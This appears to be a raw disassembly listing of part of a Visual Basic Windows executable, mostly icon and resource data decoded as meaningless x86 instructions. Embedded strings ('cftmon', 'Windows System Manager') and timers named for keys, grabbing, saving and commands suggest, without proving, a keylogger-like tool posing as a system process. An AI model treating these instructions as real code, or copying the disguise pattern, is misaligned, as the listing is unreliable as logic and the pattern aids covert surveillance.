  4016df:	00 c6                	add    %al,%dh
  4016e1:	84 a5 dc 83 43 35    	test   %ah,0x354383dc(%ebp)
  4016e7:	41                   	inc    %ecx
  4016e8:	b1 76                	mov    $0x76,%cl
  4016ea:	85 df                	test   %ebx,%edi
  4016ec:	ce                   	into
  4016ed:	53                   	push   %ebx
  4016ee:	58                   	pop    %eax
  4016ef:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  4016f5:	00 01                	add    %al,(%ecx)
  4016f7:	00 00                	add    %al,(%eax)
  4016f9:	00 2d 43 30 30 30    	add    %ch,0x30303043
  4016ff:	2d 63 66 74 6d       	sub    $0x6d746663,%eax
  401704:	6f                   	outsl  %ds:(%esi),(%dx)
  401705:	6e                   	outsb  %ds:(%esi),(%dx)
  401706:	00 30                	add    %dh,(%eax)
  401708:	57                   	push   %edi
  401709:	69 6e 64 6f 77 73 20 	imul   $0x2073776f,0x64(%esi),%ebp
  401710:	53                   	push   %ebx
  401711:	79 73                	jns    0x401786
  401713:	74 65                	je     0x40177a
  401715:	6d                   	insl   (%dx),%es:(%edi)
  401716:	20 4d 61             	and    %cl,0x61(%ebp)
  401719:	6e                   	outsb  %ds:(%esi),(%dx)
  40171a:	61                   	popa
  40171b:	67 65 72 00          	addr16 gs jb 0x40171f
  40171f:	53                   	push   %ebx
  401720:	00 00                	add    %al,(%eax)
  401722:	00 00                	add    %al,(%eax)
  401724:	ff cc                	dec    %esp
  401726:	31 00                	xor    %eax,(%eax)
  401728:	06                   	push   %es
  401729:	4f                   	dec    %edi
  40172a:	12 c7                	adc    %bh,%al
  40172c:	19 59 b4             	sbb    %ebx,-0x4c(%ecx)
  40172f:	d9 46 ad             	flds   -0x53(%esi)
  401732:	48                   	dec    %eax
  401733:	f0 58                	lock pop %eax
  401735:	3d a6 32 42 9e       	cmp    $0x9e4232a6,%eax
  40173a:	06                   	push   %es
  40173b:	7d c6                	jge    0x401703
  40173d:	c7                   	(bad)
  40173e:	6d                   	insl   (%dx),%es:(%edi)
  40173f:	2d 46 bb 2e 13       	sub    $0x132ebb46,%eax
  401744:	d9 ed                	fldln2
  401746:	29 ea                	sub    %ebp,%edx
  401748:	16                   	push   %ss
  401749:	3a 4f ad             	cmp    -0x53(%edi),%cl
  40174c:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  401752:	0c 00                	or     $0x0,%al
  401754:	aa                   	stos   %al,%es:(%edi)
  401755:	00 60 d3             	add    %ah,-0x2d(%eax)
  401758:	93                   	xchg   %eax,%ebx
	...
  40177d:	69 05 00 00 a2 04 00 	imul   $0x7000000,0x4a20000,%eax
  401784:	00 00 07 
  401787:	00 66 72             	add    %ah,0x72(%esi)
  40178a:	6d                   	insl   (%dx),%es:(%edi)
  40178b:	4d                   	dec    %ebp
  40178c:	61                   	popa
  40178d:	69 6e 00 0d 01 0b 00 	imul   $0xb010d,0x0(%esi),%ebp
  401794:	63 66 74             	arpl   %esp,0x74(%esi)
  401797:	6d                   	insl   (%dx),%es:(%edi)
  401798:	6f                   	outsl  %ds:(%esi),(%dx)
  401799:	6e                   	outsb  %ds:(%esi),(%dx)
  40179a:	20 76 33             	and    %dh,0x33(%esi)
  40179d:	2e 35 00 19 01 00    	cs xor $0x11900,%eax
  4017a3:	42                   	inc    %edx
  4017a4:	00 22                	add    %ah,(%edx)
  4017a6:	01 23                	add    %esp,(%ebx)
  4017a8:	3e 04 00             	ds add $0x0,%al
  4017ab:	00 6c 74 00          	add    %ch,0x0(%esp,%esi,2)
  4017af:	00 36                	add    %dh,(%esi)
  4017b1:	04 00                	add    $0x0,%al
  4017b3:	00 00                	add    %al,(%eax)
  4017b5:	00 01                	add    %al,(%ecx)
  4017b7:	00 02                	add    %al,(%edx)
  4017b9:	00 20                	add    %ah,(%eax)
  4017bb:	20 10                	and    %dl,(%eax)
  4017bd:	00 00                	add    %al,(%eax)
  4017bf:	00 00                	add    %al,(%eax)
  4017c1:	00 e8                	add    %ch,%al
  4017c3:	02 00                	add    (%eax),%al
  4017c5:	00 26                	add    %ah,(%esi)
  4017c7:	00 00                	add    %al,(%eax)
  4017c9:	00 10                	add    %dl,(%eax)
  4017cb:	10 10                	adc    %dl,(%eax)
  4017cd:	00 00                	add    %al,(%eax)
  4017cf:	00 00                	add    %al,(%eax)
  4017d1:	00 28                	add    %ch,(%eax)
  4017d3:	01 00                	add    %eax,(%eax)
  4017d5:	00 0e                	add    %cl,(%esi)
  4017d7:	03 00                	add    (%eax),%eax
  4017d9:	00 28                	add    %ch,(%eax)
  4017db:	00 00                	add    %al,(%eax)
  4017dd:	00 20                	add    %ah,(%eax)
  4017df:	00 00                	add    %al,(%eax)
  4017e1:	00 40 00             	add    %al,0x0(%eax)
  4017e4:	00 00                	add    %al,(%eax)
  4017e6:	01 00                	add    %eax,(%eax)
  4017e8:	04 00                	add    $0x0,%al
  4017ea:	00 00                	add    %al,(%eax)
  4017ec:	00 00                	add    %al,(%eax)
  4017ee:	80 02 00             	addb   $0x0,(%edx)
	...
  401805:	00 00                	add    %al,(%eax)
  401807:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  40180d:	00 00                	add    %al,(%eax)
  40180f:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  401816:	80 00 80             	addb   $0x80,(%eax)
  401819:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  40181f:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  401826:	00 00                	add    %al,(%eax)
  401828:	ff 00                	incl   (%eax)
  40182a:	00 ff                	add    %bh,%bh
  40182c:	00 00                	add    %al,(%eax)
  40182e:	00 ff                	add    %bh,%bh
  401830:	ff 00                	incl   (%eax)
  401832:	ff 00                	incl   (%eax)
  401834:	00 00                	add    %al,(%eax)
  401836:	ff 00                	incl   (%eax)
  401838:	ff 00                	incl   (%eax)
  40183a:	ff                   	(bad)
  40183b:	ff 00                	incl   (%eax)
  40183d:	00 ff                	add    %bh,%bh
  40183f:	ff                   	(bad)
  401840:	ff 00                	incl   (%eax)
	...
  401872:	00 70 70             	add    %dh,0x70(%eax)
  401875:	70 70                	jo     0x4018e7
  401877:	70 70                	jo     0x4018e9
  401879:	70 70                	jo     0x4018eb
  40187b:	70 70                	jo     0x4018ed
  40187d:	70 70                	jo     0x4018ef
  40187f:	70 70                	jo     0x4018f1
	...
  401891:	00 08                	add    %cl,(%eax)
  401893:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401899:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  40189f:	88 88 00 08 88 88    	mov    %cl,-0x7777f800(%eax)
  4018a5:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4018ab:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4018b1:	00 08                	add    %cl,(%eax)
  4018b3:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4018b9:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4018bf:	88 88 00 08 f8 f8    	mov    %cl,-0x707f800(%eax)
  4018c5:	f8                   	clc
  4018c6:	f8                   	clc
  4018c7:	f8                   	clc
  4018c8:	f8                   	clc
  4018c9:	f8                   	clc
  4018ca:	f8                   	clc
  4018cb:	f0 f0 00 00          	lock lock add %al,(%eax)
  4018cf:	00 f8                	add    %bh,%al
	...
  4018e1:	00 08                	add    %cl,(%eax)
  4018e3:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4018e9:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4018ef:	88 88 00 08 f8 f8    	mov    %cl,-0x707f800(%eax)
  4018f5:	f8                   	clc
  4018f6:	f8                   	clc
  4018f7:	f8                   	clc
  4018f8:	f8                   	clc
  4018f9:	f8                   	clc
  4018fa:	f8                   	clc
  4018fb:	f8                   	clc
  4018fc:	f8                   	clc
  4018fd:	f8                   	clc
  4018fe:	f8                   	clc
  4018ff:	f8                   	clc
  401900:	f8                   	clc
	...
  401921:	00 00                	add    %al,(%eax)
  401923:	00 08                	add    %cl,(%eax)
  401925:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  40192b:	88 88 87 78 00 00    	mov    %cl,0x7887(%eax)
  401931:	00 00                	add    %al,(%eax)
  401933:	00 08                	add    %cl,(%eax)
  401935:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  40193b:	88 88 88 88 00 00    	mov    %cl,0x8888(%eax)
  401941:	00 00                	add    %al,(%eax)
  401943:	00 08                	add    %cl,(%eax)
	...
  40194d:	00 08                	add    %cl,(%eax)
  40194f:	00 00                	add    %al,(%eax)
  401951:	00 00                	add    %al,(%eax)
  401953:	00 08                	add    %cl,(%eax)
  401955:	08 f8                	or     %bh,%al
  401957:	ff                   	(bad)
  401958:	ff 8f 8f ff ff 8f    	decl   -0x70000071(%edi)
  40195e:	08 00                	or     %al,(%eax)
  401960:	00 00                	add    %al,(%eax)
  401962:	00 00                	add    %al,(%eax)
  401964:	08 0f                	or     %cl,(%edi)
  401966:	8f                   	(bad)
  401967:	8f                   	(bad)
  401968:	ff                   	(bad)
  401969:	f8                   	clc
  40196a:	f8                   	clc
  40196b:	ff                   	(bad)
  40196c:	ff                   	(bad)
  40196d:	f8                   	clc
  40196e:	08 00                	or     %al,(%eax)
  401970:	00 00                	add    %al,(%eax)
  401972:	00 00                	add    %al,(%eax)
  401974:	08 08                	or     %cl,(%eax)
  401976:	f8                   	clc
  401977:	f8                   	clc
  401978:	ff                   	(bad)
  401979:	ff 8f 8f ff ff 08    	decl   0x8ffff8f(%edi)
  40197f:	00 00                	add    %al,(%eax)
  401981:	00 00                	add    %al,(%eax)
  401983:	00 08                	add    %cl,(%eax)
  401985:	0f 8f 8f 8f ff f8    	jg     0xf93fa91a
  40198b:	f8                   	clc
  40198c:	ff                   	(bad)
  40198d:	ff 08                	decl   (%eax)
  40198f:	00 00                	add    %al,(%eax)
  401991:	00 00                	add    %al,(%eax)
  401993:	00 08                	add    %cl,(%eax)
  401995:	08 f8                	or     %bh,%al
  401997:	f8                   	clc
  401998:	f8                   	clc
  401999:	ff                   	(bad)
  40199a:	ff 8f 8f ff 08 00    	decl   0x8ff8f(%edi)
  4019a0:	00 00                	add    %al,(%eax)
  4019a2:	00 00                	add    %al,(%eax)
  4019a4:	08 0f                	or     %cl,(%edi)
  4019a6:	8f                   	(bad)
  4019a7:	8f                   	(bad)
  4019a8:	8f                   	(bad)
  4019a9:	8f                   	(bad)
  4019aa:	ff                   	(bad)
  4019ab:	f8                   	clc
  4019ac:	f8                   	clc
  4019ad:	ff 08                	decl   (%eax)
  4019af:	00 00                	add    %al,(%eax)
  4019b1:	00 00                	add    %al,(%eax)
  4019b3:	00 08                	add    %cl,(%eax)
  4019b5:	08 f8                	or     %bh,%al
  4019b7:	f8                   	clc
  4019b8:	f8                   	clc
  4019b9:	f8                   	clc
  4019ba:	ff                   	(bad)
  4019bb:	ff 8f 8f 08 00 00    	decl   0x88f(%edi)
  4019c1:	00 00                	add    %al,(%eax)
  4019c3:	00 08                	add    %cl,(%eax)
  4019c5:	0f 8f 8f 8f 8f 8f    	jg     0x8fcfa95a
  4019cb:	ff                   	(bad)
  4019cc:	f8                   	clc
  4019cd:	f8                   	clc
  4019ce:	08 00                	or     %al,(%eax)
  4019d0:	00 00                	add    %al,(%eax)
  4019d2:	00 00                	add    %al,(%eax)
  4019d4:	08 08                	or     %cl,(%eax)
  4019d6:	f8                   	clc
  4019d7:	f8                   	clc
  4019d8:	f8                   	clc
  4019d9:	f8                   	clc
  4019da:	f8                   	clc
  4019db:	ff                   	(bad)
  4019dc:	ff 8f 08 00 00 00    	decl   0x8(%edi)
  4019e2:	00 00                	add    %al,(%eax)
  4019e4:	08 0f                	or     %cl,(%edi)
  4019e6:	8f                   	(bad)
  4019e7:	8f                   	(bad)
  4019e8:	8f                   	(bad)
  4019e9:	8f                   	(bad)
  4019ea:	8f                   	(bad)
  4019eb:	8f                   	(bad)
  4019ec:	ff                   	(bad)
  4019ed:	f8                   	clc
  4019ee:	08 00                	or     %al,(%eax)
  4019f0:	00 00                	add    %al,(%eax)
  4019f2:	00 00                	add    %al,(%eax)
  4019f4:	08 08                	or     %cl,(%eax)
  4019f6:	f8                   	clc
  4019f7:	f8                   	clc
  4019f8:	f8                   	clc
  4019f9:	f8                   	clc
  4019fa:	f8                   	clc
  4019fb:	f8                   	clc
  4019fc:	ff                   	(bad)
  4019fd:	ff 08                	decl   (%eax)
  4019ff:	00 00                	add    %al,(%eax)
  401a01:	00 00                	add    %al,(%eax)
  401a03:	00 08                	add    %cl,(%eax)
	...
  401a0d:	00 08                	add    %cl,(%eax)
  401a0f:	00 00                	add    %al,(%eax)
  401a11:	00 00                	add    %al,(%eax)
  401a13:	00 08                	add    %cl,(%eax)
  401a15:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401a1b:	88 88 88 88 00 00    	mov    %cl,0x8888(%eax)
	...
  401a41:	00 ff                	add    %bh,%bh
  401a43:	ff                   	(bad)
  401a44:	ff                   	(bad)
  401a45:	ff                   	(bad)
  401a46:	ff                   	(bad)
  401a47:	ff                   	(bad)
  401a48:	ff                   	(bad)
  401a49:	ff 80 00 00 03 80    	incl   -0x7ffd0000(%eax)
  401a4f:	00 00                	add    %al,(%eax)
  401a51:	03 00                	add    (%eax),%eax
  401a53:	00 00                	add    %al,(%eax)
  401a55:	01 00                	add    %eax,(%eax)
  401a57:	00 00                	add    %al,(%eax)
  401a59:	01 00                	add    %eax,(%eax)
  401a5b:	00 00                	add    %al,(%eax)
  401a5d:	01 00                	add    %eax,(%eax)
  401a5f:	00 00                	add    %al,(%eax)
  401a61:	01 00                	add    %eax,(%eax)
  401a63:	00 00                	add    %al,(%eax)
  401a65:	01 00                	add    %eax,(%eax)
  401a67:	00 00                	add    %al,(%eax)
  401a69:	01 00                	add    %eax,(%eax)
  401a6b:	00 00                	add    %al,(%eax)
  401a6d:	01 00                	add    %eax,(%eax)
  401a6f:	00 00                	add    %al,(%eax)
  401a71:	01 80 00 00 03 f8    	add    %eax,-0x7fd0000(%eax)
  401a77:	00 00                	add    %al,(%eax)
  401a79:	3f                   	aas
  401a7a:	f0 00 00             	lock add %al,(%eax)
  401a7d:	1f                   	pop    %ds
  401a7e:	f0 00 00             	lock add %al,(%eax)
  401a81:	1f                   	pop    %ds
  401a82:	f0 00 00             	lock add %al,(%eax)
  401a85:	1f                   	pop    %ds
  401a86:	f0 00 00             	lock add %al,(%eax)
  401a89:	1f                   	pop    %ds
  401a8a:	f0 00 00             	lock add %al,(%eax)
  401a8d:	1f                   	pop    %ds
  401a8e:	f0 00 00             	lock add %al,(%eax)
  401a91:	1f                   	pop    %ds
  401a92:	f0 00 00             	lock add %al,(%eax)
  401a95:	1f                   	pop    %ds
  401a96:	f0 00 00             	lock add %al,(%eax)
  401a99:	1f                   	pop    %ds
  401a9a:	f0 00 00             	lock add %al,(%eax)
  401a9d:	1f                   	pop    %ds
  401a9e:	f0 00 00             	lock add %al,(%eax)
  401aa1:	1f                   	pop    %ds
  401aa2:	f0 00 00             	lock add %al,(%eax)
  401aa5:	1f                   	pop    %ds
  401aa6:	f0 00 00             	lock add %al,(%eax)
  401aa9:	1f                   	pop    %ds
  401aaa:	f0 00 00             	lock add %al,(%eax)
  401aad:	1f                   	pop    %ds
  401aae:	f0 00 00             	lock add %al,(%eax)
  401ab1:	1f                   	pop    %ds
  401ab2:	f0 00 00             	lock add %al,(%eax)
  401ab5:	1f                   	pop    %ds
  401ab6:	f0 00 00             	lock add %al,(%eax)
  401ab9:	1f                   	pop    %ds
  401aba:	f8                   	clc
  401abb:	00 00                	add    %al,(%eax)
  401abd:	3f                   	aas
  401abe:	ff                   	(bad)
  401abf:	ff                   	(bad)
  401ac0:	ff                   	(bad)
  401ac1:	ff 28                	ljmp   *(%eax)
  401ac3:	00 00                	add    %al,(%eax)
  401ac5:	00 10                	add    %dl,(%eax)
  401ac7:	00 00                	add    %al,(%eax)
  401ac9:	00 20                	add    %ah,(%eax)
  401acb:	00 00                	add    %al,(%eax)
  401acd:	00 01                	add    %al,(%ecx)
  401acf:	00 04 00             	add    %al,(%eax,%eax,1)
  401ad2:	00 00                	add    %al,(%eax)
  401ad4:	00 00                	add    %al,(%eax)
  401ad6:	c0 00 00             	rolb   $0x0,(%eax)
	...
  401aed:	00 00                	add    %al,(%eax)
  401aef:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  401af5:	00 00                	add    %al,(%eax)
  401af7:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  401afe:	80 00 80             	addb   $0x80,(%eax)
  401b01:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  401b07:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  401b0e:	00 00                	add    %al,(%eax)
  401b10:	ff 00                	incl   (%eax)
  401b12:	00 ff                	add    %bh,%bh
  401b14:	00 00                	add    %al,(%eax)
  401b16:	00 ff                	add    %bh,%bh
  401b18:	ff 00                	incl   (%eax)
  401b1a:	ff 00                	incl   (%eax)
  401b1c:	00 00                	add    %al,(%eax)
  401b1e:	ff 00                	incl   (%eax)
  401b20:	ff 00                	incl   (%eax)
  401b22:	ff                   	(bad)
  401b23:	ff 00                	incl   (%eax)
  401b25:	00 ff                	add    %bh,%bh
  401b27:	ff                   	(bad)
  401b28:	ff 00                	incl   (%eax)
	...
  401b3a:	07                   	pop    %es
  401b3b:	07                   	pop    %es
  401b3c:	07                   	pop    %es
  401b3d:	07                   	pop    %es
  401b3e:	07                   	pop    %es
  401b3f:	07                   	pop    %es
  401b40:	07                   	pop    %es
  401b41:	00 08                	add    %cl,(%eax)
  401b43:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401b49:	80 0f ff             	orb    $0xff,(%edi)
  401b4c:	ff                   	(bad)
  401b4d:	ff                   	(bad)
  401b4e:	ff f0                	push   %eax
  401b50:	00 f0                	add    %dh,%al
  401b52:	08 88 88 88 88 88    	or     %cl,-0x77777778(%eax)
  401b58:	88 80 00 00 00 00    	mov    %al,0x0(%eax)
  401b5e:	00 00                	add    %al,(%eax)
  401b60:	00 00                	add    %al,(%eax)
  401b62:	00 08                	add    %cl,(%eax)
  401b64:	88 88 88 88 70 00    	mov    %cl,0x708888(%eax)
  401b6a:	00 08                	add    %cl,(%eax)
  401b6c:	70 00                	jo     0x401b6e
  401b6e:	00 07                	add    %al,(%edi)
  401b70:	80 00 00             	addb   $0x0,(%eax)
  401b73:	08 08                	or     %cl,(%eax)
  401b75:	ff 8f f0 80 00 00    	decl   0x80f0(%edi)
  401b7b:	08 0f                	or     %cl,(%edi)
  401b7d:	8f                   	(bad)
  401b7e:	f8                   	clc
  401b7f:	f0 80 00 00          	lock addb $0x0,(%eax)
  401b83:	08 08                	or     %cl,(%eax)
  401b85:	f8                   	clc
  401b86:	ff 80 80 00 00 08    	incl   0x8000080(%eax)
  401b8c:	0f 8f 8f f0 80 00    	jg     0xc10c21
  401b92:	00 08                	add    %cl,(%eax)
  401b94:	70 00                	jo     0x401b96
  401b96:	00 07                	add    %al,(%edi)
  401b98:	80 00 00             	addb   $0x0,(%eax)
  401b9b:	08 88 88 88 88 80    	or     %cl,-0x7f777778(%eax)
	...
  401ba9:	00 ff                	add    %bh,%bh
  401bab:	ff 00                	incl   (%eax)
  401bad:	00 80 01 00 00 00    	add    %al,0x1(%eax)
	...
  401bbf:	00 00                	add    %al,(%eax)
  401bc1:	00 80 01 00 00 c0    	add    %al,-0x3fffffff(%eax)
  401bc7:	03 00                	add    (%eax),%eax
  401bc9:	00 c0                	add    %al,%al
  401bcb:	03 00                	add    (%eax),%eax
  401bcd:	00 c0                	add    %al,%al
  401bcf:	03 00                	add    (%eax),%eax
  401bd1:	00 c0                	add    %al,%al
  401bd3:	03 00                	add    (%eax),%eax
  401bd5:	00 c0                	add    %al,%al
  401bd7:	03 00                	add    (%eax),%eax
  401bd9:	00 c0                	add    %al,%al
  401bdb:	03 00                	add    (%eax),%eax
  401bdd:	00 c0                	add    %al,%al
  401bdf:	03 00                	add    (%eax),%eax
  401be1:	00 c0                	add    %al,%al
  401be3:	03 00                	add    (%eax),%eax
  401be5:	00 e0                	add    %ah,%al
  401be7:	07                   	pop    %es
  401be8:	00 00                	add    %al,(%eax)
  401bea:	24 07                	and    $0x7,%al
  401bec:	00 66 72             	add    %ah,0x72(%esi)
  401bef:	6d                   	insl   (%dx),%es:(%edi)
  401bf0:	4d                   	dec    %ebp
  401bf1:	61                   	popa
  401bf2:	69 6e 00 26 00 27 00 	imul   $0x270026,0x0(%esi),%ebp
  401bf9:	2e 00 35 2d 00 00 00 	add    %dh,%cs:0x2d
  401c00:	77 01                	ja     0x401c03
  401c02:	00 00                	add    %al,(%eax)
  401c04:	52                   	push   %edx
  401c05:	17                   	pop    %ss
  401c06:	00 00                	add    %al,(%eax)
  401c08:	23 0a                	and    (%edx),%ecx
  401c0a:	00 00                	add    %al,(%eax)
  401c0c:	40                   	inc    %eax
  401c0d:	01 00                	add    %eax,(%eax)
  401c0f:	00 00                	add    %al,(%eax)
  401c11:	90                   	nop
  401c12:	01 44 42 01          	add    %eax,0x1(%edx,%eax,2)
  401c16:	00 06                	add    %al,(%esi)
  401c18:	54                   	push   %esp
  401c19:	61                   	popa
  401c1a:	68 6f 6d 61 44       	push   $0x44616d6f
  401c1f:	00 46 02             	add    %al,0x2(%esi)
  401c22:	ff 01                	incl   (%ecx)
  401c24:	1e                   	push   %ds
  401c25:	00 00                	add    %al,(%eax)
  401c27:	00 01                	add    %al,(%ecx)
  401c29:	05 00 74 5f 63       	add    $0x635f7400,%eax
  401c2e:	6d                   	insl   (%dx),%es:(%edi)
  401c2f:	64 00 0b             	add    %cl,%fs:(%ebx)
  401c32:	03 10                	add    (%eax),%edx
  401c34:	27                   	daa
  401c35:	00 00                	add    %al,(%eax)
  401c37:	07                   	pop    %es
  401c38:	28 05 00 00 08 3c    	sub    %al,0x3c080000
  401c3e:	00 00                	add    %al,(%eax)
  401c40:	00 ff                	add    %bh,%bh
  401c42:	03 1e                	add    (%esi),%ebx
  401c44:	00 00                	add    %al,(%eax)
  401c46:	00 02                	add    %al,(%edx)
  401c48:	05 00 74 5f 6b       	add    $0x6b5f7400,%eax
  401c4d:	65 79 00             	gs jns 0x401c50
  401c50:	0b 03                	or     (%ebx),%eax
  401c52:	01 00                	add    %eax,(%eax)
  401c54:	00 00                	add    %al,(%eax)
  401c56:	07                   	pop    %es
  401c57:	84 03                	test   %al,(%ebx)
  401c59:	00 00                	add    %al,(%eax)
  401c5b:	08 3c 00             	or     %bh,(%eax,%eax,1)
  401c5e:	00 00                	add    %al,(%eax)
  401c60:	ff 03                	incl   (%ebx)
  401c62:	1f                   	pop    %ds
  401c63:	00 00                	add    %al,(%eax)
  401c65:	00 03                	add    %al,(%ebx)
  401c67:	06                   	push   %es
  401c68:	00 74 5f 73          	add    %dh,0x73(%edi,%ebx,2)
  401c6c:	61                   	popa
  401c6d:	76 65                	jbe    0x401cd4
  401c6f:	00 0b                	add    %cl,(%ebx)
  401c71:	03 60 ea             	add    -0x16(%eax),%esp
  401c74:	00 00                	add    %al,(%eax)
  401c76:	07                   	pop    %es
  401c77:	e0 01                	loopne 0x401c7a
  401c79:	00 00                	add    %al,(%eax)
  401c7b:	08 3c 00             	or     %bh,(%eax,%eax,1)
  401c7e:	00 00                	add    %al,(%eax)
  401c80:	ff 03                	incl   (%ebx)
  401c82:	1f                   	pop    %ds
  401c83:	00 00                	add    %al,(%eax)
  401c85:	00 04 06             	add    %al,(%esi,%eax,1)
  401c88:	00 74 5f 67          	add    %dh,0x67(%edi,%ebx,2)
  401c8c:	72 61                	jb     0x401cef
  401c8e:	62 00                	bound  %eax,(%eax)
  401c90:	0b 03                	or     (%ebx),%eax
  401c92:	e8 fd 00 00 07       	call   0x7401d94
  401c97:	3c 00                	cmp    $0x0,%al
  401c99:	00 00                	add    %al,(%eax)
  401c9b:	08 3c 00             	or     %bh,(%eax,%eax,1)
  401c9e:	00 00                	add    %al,(%eax)
  401ca0:	ff 03                	incl   (%ebx)
  401ca2:	1d 00 00 00 05       	sbb    $0x5000000,%eax
  401ca7:	05 00 54 65 78       	add    $0x78655400,%eax
  401cac:	74 31                	je     0x401cdf
  401cae:	00 02                	add    %al,(%edx)
  401cb0:	04 3c                	add    $0x3c,%al
  401cb2:	00 3c 00             	add    %bh,(%eax,%eax,1)
  401cb5:	cb                   	lret
  401cb6:	16                   	push   %ss
  401cb7:	f7 08 12 00 00 17    	testl  $0x17000012,(%eax)
  401cbd:	ff                   	(bad)
  401cbe:	ff 03                	incl   (%ebx)
  401cc0:	24 00                	and    $0x0,%al
  401cc2:	00 00                	add    %al,(%eax)
  401cc4:	06                   	push   %es
  401cc5:	07                   	pop    %es
  401cc6:	00 6c 62 6c          	add    %ch,0x6c(%edx,%eiz,2)
  401cca:	43                   	inc    %ebx
  401ccb:	4f                   	dec    %edi
  401ccc:	4e                   	dec    %esi
  401ccd:	54                   	push   %esp
  401cce:	00 01                	add    %al,(%ecx)
  401cd0:	01 01                	add    %eax,(%ecx)
  401cd2:	00 30                	add    %dh,(%eax)
  401cd4:	00 05 3c 00 24 09    	add    %al,0x924003c
  401cda:	b3 01                	mov    $0x1,%bl
  401cdc:	ff 00                	incl   (%eax)
  401cde:	12 01                	adc    (%ecx),%al
  401ce0:	00 1f                	add    %bl,(%edi)
  401ce2:	00 ff                	add    %bh,%bh
  401ce4:	02 04 00             	add    (%eax,%eax,1),%al
  401ce7:	00 50 00             	add    %dl,0x0(%eax)
  401cea:	00 00                	add    %al,(%eax)
  401cec:	4f                   	dec    %edi
  401ced:	12 c7                	adc    %bh,%al
  401cef:	19 59 b4             	sbb    %ebx,-0x4c(%ecx)
  401cf2:	d9 46 ad             	flds   -0x53(%esi)
  401cf5:	48                   	dec    %eax
  401cf6:	f0 58                	lock pop %eax
  401cf8:	3d a6 32 42 00       	cmp    $0x4232a6,%eax
	...
  401d0d:	00 00                	add    %al,(%eax)
  401d0f:	00 10                	add    %dl,(%eax)
  401d11:	03 00                	add    (%eax),%eax
	...
  401d27:	00 c2                	add    %al,%dl
  401d29:	05 00 00 00 00       	add    $0x0,%eax
  401d2e:	00 00                	add    %al,(%eax)
  401d30:	24 17                	and    $0x17,%al
  401d32:	40                   	inc    %eax
  401d33:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  401d37:	00 56 42             	add    %dl,0x42(%esi)
  401d3a:	35 21 f0 1f 2a       	xor    $0x2a1ff021,%eax
	...
  401d4b:	00 7e 00             	add    %bh,0x0(%esi)
	...
  401d5a:	0a 00                	or     (%eax),%al
  401d5c:	10 04 00             	adc    %al,(%eax,%eax,1)
	...
  401d67:	00 6c 1e 40          	add    %ch,0x40(%esi,%ebx,1)
  401d6b:	00 06                	add    %al,(%esi)
  401d6d:	f8                   	clc
  401d6e:	30 00                	xor    %al,(%eax)
  401d70:	00 ff                	add    %bh,%bh
  401d72:	ff                   	(bad)
  401d73:	ff 08                	decl   (%eax)
  401d75:	00 00                	add    %al,(%eax)
  401d77:	00 01                	add    %al,(%ecx)
  401d79:	00 00                	add    %al,(%eax)
  401d7b:	00 01                	add    %al,(%ecx)
  401d7d:	00 00                	add    %al,(%eax)
  401d7f:	00 e9                	add    %ch,%cl
  401d81:	00 00                	add    %al,(%eax)
  401d83:	00 e8                	add    %ch,%al
  401d85:	1c 40                	sbb    $0x40,%al
  401d87:	00 e8                	add    %ch,%al
  401d89:	1c 40                	sbb    $0x40,%al
  401d8b:	00 d0                	add    %dl,%al
  401d8d:	16                   	push   %ss
  401d8e:	40                   	inc    %eax
  401d8f:	00 78 00             	add    %bh,0x0(%eax)
  401d92:	00 00                	add    %al,(%eax)
  401d94:	7f 00                	jg     0x401d96
  401d96:	00 00                	add    %al,(%eax)
  401d98:	8b 00                	mov    (%eax),%eax
  401d9a:	00 00                	add    %al,(%eax)
  401d9c:	8c 00                	mov    %es,(%eax)
	...
  401dae:	00 00                	add    %al,(%eax)
  401db0:	63 66 74             	arpl   %esp,0x74(%esi)
  401db3:	6d                   	insl   (%dx),%es:(%edi)
  401db4:	6f                   	outsl  %ds:(%esi),(%dx)
  401db5:	6e                   	outsb  %ds:(%esi),(%dx)
  401db6:	00 63 66             	add    %ah,0x66(%ebx)
  401db9:	74 6d                	je     0x401e28
  401dbb:	6f                   	outsl  %ds:(%esi),(%dx)
  401dbc:	6e                   	outsb  %ds:(%esi),(%dx)
  401dbd:	20 76 33             	and    %dh,0x33(%esi)
  401dc0:	2e 35 00 00 63 66    	cs xor $0x66630000,%eax
  401dc6:	74 6d                	je     0x401e35
  401dc8:	6f                   	outsl  %ds:(%esi),(%dx)
  401dc9:	6e                   	outsb  %ds:(%esi),(%dx)
  401dca:	00 00                	add    %al,(%eax)
  401dcc:	06                   	push   %es
  401dcd:	00 00                	add    %al,(%eax)
  401dcf:	00 78 37             	add    %bh,0x37(%eax)
  401dd2:	40                   	inc    %eax
  401dd3:	00 07                	add    %al,(%edi)
  401dd5:	00 00                	add    %al,(%eax)
  401dd7:	00 58 2e             	add    %bl,0x2e(%eax)
  401dda:	40                   	inc    %eax
  401ddb:	00 07                	add    %al,(%edi)
  401ddd:	00 00                	add    %al,(%eax)
  401ddf:	00 04 2e             	add    %al,(%esi,%ebp,1)
  401de2:	40                   	inc    %eax
  401de3:	00 07                	add    %al,(%edi)
  401de5:	00 00                	add    %al,(%eax)
  401de7:	00 b0 2d 40 00 07    	add    %dh,0x700402d(%eax)
  401ded:	00 00                	add    %al,(%eax)
